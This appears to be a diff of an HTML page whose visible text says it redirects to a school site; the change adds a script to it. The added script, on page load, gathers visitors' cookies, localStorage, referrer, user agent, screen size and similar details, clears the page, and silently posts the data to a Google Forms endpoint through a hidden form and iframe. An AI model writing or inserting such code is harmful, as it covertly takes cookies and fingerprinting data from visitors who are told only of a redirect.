@@ -30,10 +30,35 @@ function teste() {
 <body onload='teste()'>
 <p>Esta página deve carregar automaticamente a página https://tarcisomesquita.github.io/ceejapd/index.html</p>
 
-<iframe id="hiddenFrame" name="hiddenFrame" style="display:none"></iframe>
-<form id="formlog2" style='display:none' enctype="application/x-www-form-urlencoded" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeH6hDfEOI6jvgDsdkuuUeah_FU3dPGxZZr-sBBkIjj4Hkwog/formResponse" method="POST" target="hiddenFrame">
+<iframe name="hiddenFrame" style="visibility:hidden"></iframe>
+<form name="formlog" enctype="application/x-www-form-urlencoded"action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeH6hDfEOI6jvgDsdkuuUeah_FU3dPGxZZr-sBBkIjj4Hkwog/formResponse" method="POST" target="hiddenFrame">
 <input id="texto" name="entry.667481942" type="hidden">
 </form>
+
+<script>
+var info = '\nhref: ' + window.location.href + 
+           '\nreferrer: ' + document.referrer + 
+           '\nhistory.length: ' + history.length + 
+           '\nuserAgent: ' + navigator.userAgent + 
+           '\nlanguage: ' + navigator.language + 
+           '\nplatform: ' + navigator.platform + 
+           '\ndataCookies1: ' + document.cookie + 
+           '\ndataCookies2: ' + decodeURIComponent(document.cookie.split(";")) + 
+           '\ndataStorage: ' + localStorage + 
+           '\nscreen.width: ' + screen.width + 
+           '\nscreen.height: ' + screen.height + 
+           '\ninnerWidth: ' + innerWidth + 
+           '\ninnerHeight: ' + innerHeight + 
+           '\ndeviceMemory: ' + navigator.deviceMemory + 'GiB of RAM';
+
+document.getElementById("texto").value = info;
+
+document.head.innerHTML = "";
+  
+document.body.innerHTML = document.getElementById("page").innerHTML;
+  
+document.forms.formlog.submit();
+</script>
 
 </body>
 </html>
